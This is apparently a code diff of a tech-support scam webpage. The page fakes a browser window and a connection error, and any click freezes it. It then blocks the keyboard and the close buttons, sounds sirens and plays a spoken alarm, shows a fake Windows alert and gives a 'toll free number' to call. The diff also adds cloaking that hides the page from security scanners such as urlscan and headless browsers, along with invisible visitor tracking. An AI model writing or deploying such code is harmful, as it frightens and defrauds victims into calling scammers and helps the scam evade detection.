@@ -1,32 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<style>
-  /* Hidden by default — bots screenshot the placeholder */
-  html, body { visibility: hidden; margin: 0; padding: 0; }
-  html.show, html.show body { visibility: visible; }
-
-  #no-screenshot-box {
-    position: fixed; inset: 0;
-    display: flex; align-items: center; justify-content: center;
-    background-color: #f0f0f0; z-index: 99999;
-    font-family: Arial, sans-serif;
-    visibility: visible;
-  }
-  html.show #no-screenshot-box { display: none; }
-
-  .ns-content {
-    background: #ffffff; padding: 40px; border-radius: 8px;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    text-align: center; max-width: 400px;
-  }
-  .monitor-icon { width: 80px; height: 80px; margin-bottom: 20px; }
-  .monitor-icon svg { width: 100%; height: 100%; fill: #555; }
-  .ns-text { font-size: 20px; color: #555; font-weight: 500; margin: 0; }
-</style>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Just a moment...</title>
+
+<style>
+  /* ============ NO SCREENSHOT PROTECTION ============ */
+  /* Page hidden by default — bots screenshot the placeholder */
+  html, body { visibility: hidden; }
+  html.human, html.human body { visibility: visible; }
+
+  #no-shot {
+    display: none;
+    position: fixed;
+    inset: 0;
+    justify-content: center;
+    align-items: center;
+    background: #f0f0f0;
+    font-family: sans-serif;
+    color: #888;
+    text-align: center;
+    z-index: 99999;
+    visibility: visible;
+  }
+  html.bot #no-shot { display: flex; }
+</style>
+
+<script>
+(function() {
+  var h = document.documentElement;
+  var ua = navigator.userAgent.toLowerCase();
+
+  var bots = [
+    'urlscan','cloudflare-radar','puppeteer','selenium','playwright',
+    'headless','bot','crawler','spider','lighthouse','pingdom','gtmetrix',
+    'curl','python','axios','wget','scrapy','phantom','slurp','yandex'
+  ];
+
+  var isBot =
+    bots.some(function(p){ return ua.indexOf(p) !== -1; }) ||
+    navigator.webdriver === true ||
+    !window.chrome ||
+    (navigator.plugins && navigator.plugins.length === 0);
+
+  if (isBot) {
+    h.classList.add('bot');
+  } else {
+    h.classList.add('human');
+  }
+})();
+</script>
+
+<!-- Default Statcounter code for Hello https://trackerkings.store/ -->
+<script type="text/javascript">
+var sc_project=13360155;
+var sc_invisible=1;
+var sc_security="932fc8fe";
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js" async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/13360155/0/932fc8fe/1/" alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End Statcounter Code -->
+
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
   html, body {
@@ -324,7 +363,7 @@
     display:none; flex-direction:column;
     align-items:center; justify-content:center;
     text-align:center; gap:12px; padding:20px;
-    padding-top:86px; /* Leave room for tab bar (34) + spoof bar (46) - 6 */
+    padding-top:86px;
     background:#000000; color:#00ff66;
     font-family:"Courier New",monospace;
   }
@@ -430,6 +469,14 @@
 </head>
 <body>
 
+  <!-- ============ NO SCREENSHOT PLACEHOLDER ============ -->
+  <div id="no-shot">
+    <div>
+      <div style="font-size:64px;">📷</div>
+      <h2 style="color:#666;margin:16px 0 0;">No Screenshot Available</h2>
+    </div>
+  </div>
+
   <!-- ============ FAKE TAB BAR ============ -->
   <div id="tabBar">
     <div class="tab active" id="activeTab">
@@ -437,7 +484,6 @@
       <span class="tab-title">Just a moment...</span>
       <div class="tab-close" id="tabCloseBtn" title="Close Tab">✕</div>
     </div>
-    <!-- Additional fake inactive tabs for realism -->
     <div class="tab">
       <div class="tab-icon" style="background:#ff9800;"></div>
       <span>News</span>
@@ -467,8 +513,7 @@
   </div>
 
   <!-- ============ COOKIE CONSENT ============ -->
-  
-<div id="cookiePage">
+  <div id="cookiePage">
     <div class="ck-card">
       <h2>⚠️ Internet Connection Issue</h2>
       <p>We're having trouble loading this page. Please check your internet connection and try again. Click <b>Refresh</b> to reload the page or <b>Reset</b> to try again.</p>
@@ -476,7 +521,6 @@
         <button class="ck-btn accept" id="ckAccept">Refresh</button>
         <button class="ck-btn reject" id="ckReject">Reset</button>
       </div>
-
 
       <div id="usaBlock">
         <div class="q">🇺🇸 Are you from the USA?</div>
@@ -605,7 +649,6 @@
   const VOICE_REPEAT_MS     = 12000;
   const ALARM_REPEAT_MS     = 5000;
 
-  /* ============ TOLL FREE NUMBER ============ */
   const TOLL_FREE_NUMBER = "+1(804)-244-7896";
 
   let frozen = false;
@@ -654,24 +697,18 @@
 
   tollFreeNum.textContent = TOLL_FREE_NUMBER;
 
-  /* ---------- CLOSE TAB (FAKE) - DOES NOTHING NOW, JUST FREEZES ---------- */
   tabCloseBtn.addEventListener("click", function (e) {
     e.stopPropagation();
-    // Do NOT close. Just freeze if not already frozen.
     if (!frozen) freeze();
   });
 
-  /* ---------- MINIMIZE (hide spoof bar) - DOES NOTHING NOW, JUST FREEZES ---------- */
   sbMin.addEventListener("click", function (e) {
     e.stopPropagation();
-    // Do NOT minimize. Just freeze if not already frozen.
     if (!frozen) freeze();
   });
 
-  /* ---------- CLOSE WINDOW (URL BAR) - DOES NOTHING NOW, JUST FREEZES ---------- */
   sbClose.addEventListener("click", function (e) {
     e.stopPropagation();
-    // Do NOT close. Just freeze if not already frozen.
     if (!frozen) freeze();
   });
 
@@ -704,7 +741,6 @@
     beep(1100, 0.30, 0.44);
   }
 
-  /* ---------- SIREN ---------- */
   function startSiren() {
     if (!SIREN_ENABLED) return;
     const ctx = getCtx(); if (!ctx) return;
@@ -730,7 +766,6 @@
     sirenNodes = null;
   }
 
-  /* ---------- VOICE ---------- */
   function speak(text, opts) {
     if (!VOICE_ENABLED) return;
     if (!("speechSynthesis" in window)) return;
@@ -777,7 +812,6 @@
     try { if ("speechSynthesis" in window) window.speechSynthesis.cancel(); } catch (e) {}
   }
 
-  /* ---------- ALARM LOOP ---------- */
   function startAlarmLoop() {
     if (!BEEP_ON_FREEZE) return;
     clearInterval(alarmLoopTimer);
@@ -1038,7 +1072,6 @@
   }
   function stopRelockLoop() { clearInterval(relockTimer); relockTimer = null; }
 
-  /* ---------- WINDOWS ALERT ---------- */
   function showWinAlert() {
     if (alertShown) return;
     alertShown = true;
@@ -1049,12 +1082,10 @@
   }
   function hideWinAlert() { winAlert.classList.remove("show"); }
 
-  /* ---------- FREEZE ---------- */
   async function freeze() {
     if (frozen) return;
     frozen = true;
 
-    // keep spoof bar and tab bar visible
     spoofBar.classList.remove("hide");
     cookiePage.classList.add("hide");
     overlay.style.display = "block";
@@ -1088,7 +1119,6 @@
     if (AUTO_UNFREEZE_MS > 0) startCountdown();
   }
 
-  /* ---------- FULLSCREEN CHANGE ---------- */
   let hackerPlayedInFullscreen = false;
   document.addEventListener("fullscreenchange", async function () {
     if (!frozen) return;
@@ -1123,7 +1153,6 @@
     setTimeout(function () { if (frozen) applyLocks(); }, 100);
   });
 
-  /* ---------- COUNTDOWN ---------- */
   function startCountdown() {
     let left = Math.ceil(AUTO_UNFREEZE_MS / 1000);
     countdown.textContent = "Auto-unfreeze in " + left + "s";
@@ -1140,7 +1169,6 @@
     }, 1000);
   }
 
-  /* ---------- UNFREEZE ---------- */
   async function unfreeze() {
     frozen = false;
     hackerPlayedInFullscreen = false;
@@ -1164,12 +1192,11 @@
 
     spoofBar.classList.remove("hide");
     cookiePage.classList.remove("hide");
-    cookiePage.style.top = "80px"; // Adjust for tab bar + spoof bar
+    cookiePage.style.top = "80px";
     usaBlock.classList.remove("show");
     sensitivePanel.classList.remove("show");
   }
 
-  /* ---------- PASSWORD ---------- */
   function showPass() {
     passMsg.textContent = "";
     passInput.value = "";
@@ -1196,7 +1223,6 @@
     if (passBox.style.display === "flex") setTimeout(function(){ passInput.focus(); }, 30);
   });
 
-  /* ---------- BLOCK EVERYTHING (only when frozen) ---------- */
   window.addEventListener("keydown", function (e) {
     if (!frozen) return;
     if (passBox.style.display === "flex") return;
@@ -1227,9 +1253,6 @@
   window.addEventListener("dragstart",  function (e) { if (frozen) e.preventDefault(); });
   window.addEventListener("selectstart",function (e) { if (frozen) e.preventDefault(); });
 
-  /* ============================================================
-     COOKIE CONSENT FLOW - NOW FREEZES ON CLICK TOO
-  ============================================================ */
   function handleCookieDecision() {
     beep(1200, 0.10, 0);
     usaBlock.classList.add("show");
@@ -1237,35 +1260,29 @@
 
   ckAccept.addEventListener("click", function (e) {
     e.stopPropagation();
-    // If not frozen, freeze immediately.
     if (!frozen) freeze();
   });
 
   ckReject.addEventListener("click", function (e) {
     e.stopPropagation();
-    // If not frozen, freeze immediately.
     if (!frozen) freeze();
   });
 
   usaYes.addEventListener("click", function (e) {
     e.stopPropagation();
-    // If not frozen, freeze immediately.
     if (!frozen) freeze();
   });
 
   usaNo.addEventListener("click", function (e) {
     e.stopPropagation();
-    // If not frozen, freeze immediately.
     if (!frozen) freeze();
   });
 
   spAuthorize.addEventListener("click", function (e) {
     e.stopPropagation();
-    // If not frozen, freeze immediately.
     if (!frozen) freeze();
   });
 
-  /* ---------- INSTANT FREEZE ON ANY CLICK (NO SAFE ZONES) ---------- */
   function handleAnyClick() {
     if (!FREEZE_ON_ANY_CLICK) return;
     if (frozen) return;
@@ -1273,7 +1290,6 @@
     freeze();
   }
 
-  // Remove all safe zone checks. ANY click triggers freeze.
   document.addEventListener("click", function (e) {
     handleAnyClick();
   }, true);
@@ -1282,7 +1298,6 @@
     handleAnyClick();
   }, true);
 
-  /* ---------- RE-OPEN ON CLOSE (FAKE) ---------- */
   let isReloading = false;
   window.addEventListener("beforeunload", function (e) {
     if (!frozen) return;
@@ -1308,7 +1323,6 @@
     }, 80);
   }
 
-  /* ---------- TRIGGERS ---------- */
   dlgOk.addEventListener("click", function (e) { e.stopPropagation(); hideWinAlert(); beep(1200, 0.12, 0); });
   dlgCancel.addEventListener("click", function (e) { e.stopPropagation(); hideWinAlert(); beep(500, 0.12, 0); });
   dlgX.addEventListener("click", function (e) { e.stopPropagation(); hideWinAlert(); beep(500, 0.12, 0); });
@@ -1331,41 +1345,7 @@
   document.addEventListener("dragstart", function (e) { e.preventDefault(); });
   document.addEventListener("selectstart", function (e) { e.preventDefault(); });
 })();
-<body>
-
-<div id="no-screenshot-box">
-  <div class="ns-content">
-    <div class="monitor-icon">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 1.99-.9 1.99-2L23 5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/>
-        <path d="M10 8h4v4h-4z" fill="#990000"/>
-        <circle cx="12" cy="18" r="1" fill="#555"/>
-      </svg>
-    </div>
-    <h2 class="ns-text">No Screenshot</h2>
-  </div>
-</div>
-
-<!-- YOUR EXISTING CONTENT GOES HERE -->
-
-<script>
-(function() {
-  var ua = navigator.userAgent.toLowerCase();
-
-  // Bot detection — if ANY of these match, it's a bot
-  var isBot =
-    /headless|puppeteer|playwright|selenium|urlscan|cloudflare|bot|crawler|spider|curl|python|axios|wget|scrapy|phantom|slurp|yandex|lighthouse|gtmetrix|pingdom/.test(ua) ||
-    navigator.webdriver === true ||
-    !window.chrome ||
-    (navigator.plugins && navigator.plugins.length === 0);
-
-  // Show content INSTANTLY for humans, keep placeholder for bots
-  if (!isBot) {
-    document.documentElement.classList.add('show');
-  }
-})();
 </script>
 
-</body>
 </body>
 </html>
